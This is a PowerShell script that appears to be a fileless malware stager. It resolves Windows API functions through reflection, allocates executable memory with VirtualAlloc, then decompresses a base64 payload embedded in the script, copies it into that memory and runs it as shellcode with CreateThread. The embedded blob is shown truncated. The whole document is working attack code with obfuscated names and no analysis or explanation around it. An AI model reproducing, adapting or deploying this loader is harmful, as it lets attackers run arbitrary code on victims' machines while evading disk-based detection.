Set-StrictMode -Version 2

function DelegateObject
{
	$tmp= Call_method "kernel32.dll" "WaitForSingleObject"
	$c=Alloc_conf @([IntPtr],[Int32])
	$rp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tmp, $c)
	return $rp
}

function Init_Thread
{
	$thr=Call_method "kernel32.dll" "CreateThread"
	$t= Alloc_conf @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr])([IntPtr])
	$r=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($thr, $t)
	return $r
}

function Alloc_conf
{
	Param ([Parameter(Position = 0, Mandatory = $True)][Type[]] $ref_obj,[Parameter(Position = 1)] [Type] $ty = [Void])
	$d=QCOu
	$App_Ass=[AppDomain]::CurrentDomain.DefineDynamicAssembly($d,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$Mem=$App_Ass.DefineDynamicModule("InMemoryModule", $false)
	$Del_Type=$Mem.DefineType("MyDelegateType","Class, Public, Sealed, AnsiClass, AutoClass",[System.MulticastDelegate])
	$c=$Del_Type.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard,$ref_obj)
	$f1=$c.SetImplementationFlags("Runtime, Managed")
	$tmp=$Del_Type.DefineMethod("Invoke","Public, HideBySig, NewSlot, Virtual",$ty,$ref_obj)
	$f2=$tmp.SetImplementationFlags("Runtime, Managed")
	$ret=$Del_Type.CreateType()
	return $ret
}

function Call_method
{
	Param ($arg1,$arg2)
	$As=[AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals("System.dll") }
	$Met=$As.GetType("Microsoft.Win32.UnsafeNativeMethods")
	$ref=$Met.GetMethod("GetProcAddress",[reflection.bindingflags] ("Public, Static"), $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)
	$han=$Met.GetMethod("GetModuleHandle",[reflection.bindingflags] ("Public, Static"), $null, [System.Reflection.CallingConventions]::Any, @([string]), $null)
	$inv=$han.Invoke($null,$arg1)
	$ObjPtr=New-Object IntPtr
	$ref_Handle=[System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef($ObjPtr,$inv))
	$retObj=$ref.Invoke($null, @($ref_Handle, $arg2))
	return $retObj
}

function Allocate
{
	$o=Call_method "kernel32.dll" "VirtualAlloc"
	$p= Alloc_conf @([IntPtr],[UInt32],[UInt32],[UInt32])([IntPtr])
	$r=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($o, $p)
	return $r
}

function Launch_Payload
{
	Param ($arg1,$arg2)
	$th=Allocate
	$ref_ptr=$th.Invoke([IntPtr]::Zero, $arg1.Length,0x3000, 0x40)
	$d=[System.Runtime.InteropServices.Marshal]::Copy($arg1, 0, $ref_ptr, $arg1.Length)
	$th=Init_Thread
	$m=$th.Invoke([IntPtr]::Zero,0,[Int64]$ref_ptr+$arg2,[IntPtr]::Zero,0,[IntPtr]::Zero)
	$obj=DelegateObject
	$v=$obj.Invoke($m, 0xffffffff) | Out-Null
}

function Init
{
	$d="7ToLVFTXtfdyZ2BAhhk/I0PQOOqQoCQWGYxQ0My [...] HCZ+4CHh0qNNyt8pMJcM7dKs3/L7//BA=="
	$dat=[System.Convert]::FromBase64String($d)
	$data=New-Object IO.Compression.DeflateStream([IO.MemoryStream][Byte[]]$dat,[IO.Compression.CompressionMode]::Decompress)
	$Buf= New-Object Byte[] 11776
	$G3d3g=$data.Read($Buf, 0, 11776)
	Launch_Payload $Buf 1032
}

Init
